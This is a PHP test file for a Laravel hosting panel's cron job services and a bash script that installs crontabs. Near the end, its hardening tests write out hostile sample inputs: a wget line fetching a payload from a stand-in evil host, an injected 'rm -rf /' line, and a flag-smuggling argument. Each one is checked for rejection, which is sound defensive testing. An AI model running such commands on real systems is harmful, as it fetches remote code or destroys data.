<?php

use App\Models\CronJob;
use App\Models\User;
use App\Services\CronJobs\CreateCronJobException;
use App\Services\CronJobs\CreateCronJobService;
use App\Services\CronJobs\DeleteCronJobException;
use App\Services\CronJobs\DeleteCronJobService;
use Illuminate\Support\Facades\Process;
use Symfony\Component\Process\Process as SymfonyProcess;

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────

function makeCronJobRow(User $user, string $schedule = '* * * * *', string $suffix = ''): CronJob
{
    return CronJob::create([
        'user_id' => $user->id,
        'schedule' => $schedule,
        'command' => 'php /home/'.$user->systemUsername.'/artisan inspire'.$suffix,
        'active' => true,
    ]);
}

// ─────────────────────────────────────────────────────────────────────────────
// CreateCronJobService
// ─────────────────────────────────────────────────────────────────────────────

test('CreateCronJobService calls laranode-cron.sh set with system username and tmp file', function () {
    Process::fake();

    $user = User::factory()->isNotAdmin()->create(['username' => 'alice']);
    makeCronJobRow($user);

    (new CreateCronJobService)->handle($user);

    Process::assertRan(function ($process) use ($user) {
        $command = $process->command;

        // command is an array: [sudo, .../laranode-cron.sh, set, systemUsername, tmpFile]
        return is_array($command)
            && str_ends_with($command[1] ?? '', 'laranode-cron.sh')
            && ($command[2] ?? '') === 'set'
            && ($command[3] ?? '') === $user->systemUsername;
    });
});

test('CreateCronJobService only passes active jobs to the script', function () {
    $capturedContent = null;

    Process::fake(function ($invocation) use (&$capturedContent) {
        $command = $invocation->command;
        // 5th arg is the tmp file path
        $tmpFile = $command[4] ?? null;
        if ($tmpFile && file_exists($tmpFile)) {
            $capturedContent = file_get_contents($tmpFile);
        }

        return Process::result(exitCode: 0);
    });

    $user = User::factory()->isNotAdmin()->create(['username' => 'bob']);
    $active = makeCronJobRow($user, '* * * * *', '_active');
    $inactive = CronJob::create([
        'user_id' => $user->id,
        'schedule' => '0 2 * * *',
        'command' => 'php /home/'.$user->systemUsername.'/artisan foo',
        'active' => false,
    ]);

    (new CreateCronJobService)->handle($user);

    expect($capturedContent)->toContain($active->command)
        ->and($capturedContent)->not->toContain($inactive->command);
});

test('CreateCronJobService throws CreateCronJobException when script fails', function () {
    Process::fake([
        '*' => Process::result(output: '', errorOutput: 'script error', exitCode: 1),
    ]);

    $user = User::factory()->isNotAdmin()->create(['username' => 'charlie']);
    makeCronJobRow($user);

    expect(fn () => (new CreateCronJobService)->handle($user))
        ->toThrow(CreateCronJobException::class);
});

test('CreateCronJobService cleans up tmp file even on failure', function () {
    $tmpFilePath = null;

    Process::fake(function ($invocation) use (&$tmpFilePath) {
        $command = $invocation->command;
        $tmpFilePath = $command[4] ?? null;

        return Process::result(exitCode: 1);
    });

    $user = User::factory()->isNotAdmin()->create(['username' => 'dave']);
    makeCronJobRow($user);

    try {
        (new CreateCronJobService)->handle($user);
    } catch (CreateCronJobException) {
        // expected
    }

    expect($tmpFilePath)->not->toBeNull()
        ->and(file_exists($tmpFilePath))->toBeFalse('temp file should be deleted after failure');
});

// ─────────────────────────────────────────────────────────────────────────────
// DeleteCronJobService
// ─────────────────────────────────────────────────────────────────────────────

test('DeleteCronJobService calls laranode-cron.sh set with remaining jobs (excluding deleted)', function () {
    $capturedContent = null;

    Process::fake(function ($invocation) use (&$capturedContent) {
        $command = $invocation->command;
        $tmpFile = $command[4] ?? null;
        if ($tmpFile && file_exists($tmpFile)) {
            $capturedContent = file_get_contents($tmpFile);
        }

        return Process::result(exitCode: 0);
    });

    $user = User::factory()->isNotAdmin()->create(['username' => 'eve']);
    $jobToKeep = makeCronJobRow($user, '0 1 * * *', '_keep');
    $jobToDelete = makeCronJobRow($user, '0 2 * * *', '_delete');

    (new DeleteCronJobService)->handle($user, $jobToDelete);

    expect($capturedContent)->toContain($jobToKeep->command)
        ->and($capturedContent)->not->toContain($jobToDelete->command);
});

test('DeleteCronJobService passes correct system username to script', function () {
    Process::fake();

    $user = User::factory()->isNotAdmin()->create(['username' => 'frank']);
    $job = makeCronJobRow($user);

    (new DeleteCronJobService)->handle($user, $job);

    Process::assertRan(function ($process) use ($user) {
        $command = $process->command;

        return is_array($command)
            && str_ends_with($command[1] ?? '', 'laranode-cron.sh')
            && ($command[2] ?? '') === 'set'
            && ($command[3] ?? '') === $user->systemUsername;
    });
});

test('DeleteCronJobService throws DeleteCronJobException when script fails', function () {
    Process::fake([
        '*' => Process::result(output: '', errorOutput: 'script error', exitCode: 1),
    ]);

    $user = User::factory()->isNotAdmin()->create(['username' => 'grace']);
    $job = makeCronJobRow($user);

    expect(fn () => (new DeleteCronJobService)->handle($user, $job))
        ->toThrow(DeleteCronJobException::class);
});

// ─────────────────────────────────────────────────────────────────────────────
// laranode-cron.sh bash hardening guard tests
// These run the real bash script directly (no Process::fake) to verify that
// the script itself rejects invalid inputs before touching the crontab.
// The script exits non-zero on all these paths without needing sudo/root.
// ─────────────────────────────────────────────────────────────────────────────

function cronScript(): string
{
    return base_path('laranode-scripts/bin/laranode-cron.sh');
}

function runCronScript(array $args): array
{
    $script = cronScript();
    if (! file_exists($script)) {
        return ['exitCode' => -1, 'output' => '', 'error' => 'script not found'];
    }

    $proc = new SymfonyProcess(array_merge(['bash', $script], $args));
    $proc->run();

    return [
        'exitCode' => $proc->getExitCode(),
        'output' => $proc->getOutput(),
        'error' => $proc->getErrorOutput(),
    ];
}

test('laranode-cron.sh rejects argument starting with dash (flag-smuggling)', function () {
    $result = runCronScript(['-u', 'testuser_ln']);

    expect($result['exitCode'])->not->toBe(0)
        ->and($result['error'])->toContain("may not start with '-'");
});

test('laranode-cron.sh rejects non-_ln target user', function () {
    $result = runCronScript(['set', 'rootuser', '/dev/null']);

    expect($result['exitCode'])->not->toBe(0)
        ->and($result['error'])->toContain('must end in _ln');
});

test('laranode-cron.sh rejects disallowed command in tmp file', function () {
    $tmpFile = tempnam(sys_get_temp_dir(), 'cron_guard_test_');
    // Write a line with a wget command (not allowed by allowlist)
    file_put_contents($tmpFile, "* * * * *\twget https://evil.example.com/payload.sh\n");
    chmod($tmpFile, 0600);

    // Use testuser_ln which exists in the container; script validates user before allowlist
    // On dev machines without testuser_ln, use a synthetic _ln name that fails at id() check.
    // We test on a known-_ln user that exists (testuser_ln) so the allowlist check is reached.
    // If testuser_ln doesn't exist, the 'user does not exist' guard fires first — still non-zero.
    $result = runCronScript(['set', 'testuser_ln', $tmpFile]);

    @unlink($tmpFile);

    expect($result['exitCode'])->not->toBe(0);
    // Either allowlist rejection or user-not-found — both are non-zero; on a system with
    // testuser_ln the allowlist message fires; on a dev machine the user check fires.
    expect($result['error'])->toMatch('/command not allowed|does not exist/');
});

test('laranode-cron.sh rejects crontab line with embedded newline injection', function () {
    $tmpFile = tempnam(sys_get_temp_dir(), 'cron_guard_test_');
    // Write two lines: the second is an injected bare command without the 5-field schedule
    file_put_contents($tmpFile, "* * * * *\tphp /home/testuser_ln/artisan inspire\nrm -rf /\n");
    chmod($tmpFile, 0600);

    $result = runCronScript(['set', 'testuser_ln', $tmpFile]);

    @unlink($tmpFile);

    // 'rm -rf /' line fails the 5-field + TAB format check, OR the user check fires first.
    // Either way, exit must be non-zero.
    expect($result['exitCode'])->not->toBe(0);
});

test('DeleteCronJobService excludes inactive jobs from the sync', function () {
    $capturedContent = null;

    Process::fake(function ($invocation) use (&$capturedContent) {
        $command = $invocation->command;
        $tmpFile = $command[4] ?? null;
        if ($tmpFile && file_exists($tmpFile)) {
            $capturedContent = file_get_contents($tmpFile);
        }

        return Process::result(exitCode: 0);
    });

    $user = User::factory()->isNotAdmin()->create(['username' => 'henry']);
    $activeJob = makeCronJobRow($user, '0 3 * * *', '_active');
    $inactiveJob = CronJob::create([
        'user_id' => $user->id,
        'schedule' => '0 4 * * *',
        'command' => 'php /home/'.$user->systemUsername.'/artisan inactive',
        'active' => false,
    ]);
    $jobToDelete = makeCronJobRow($user, '0 5 * * *', '_delete');

    (new DeleteCronJobService)->handle($user, $jobToDelete);

    // Only the active job that's NOT being deleted should appear
    expect($capturedContent)->toContain($activeJob->command)
        ->and($capturedContent)->not->toContain($inactiveJob->command)
        ->and($capturedContent)->not->toContain($jobToDelete->command);
});
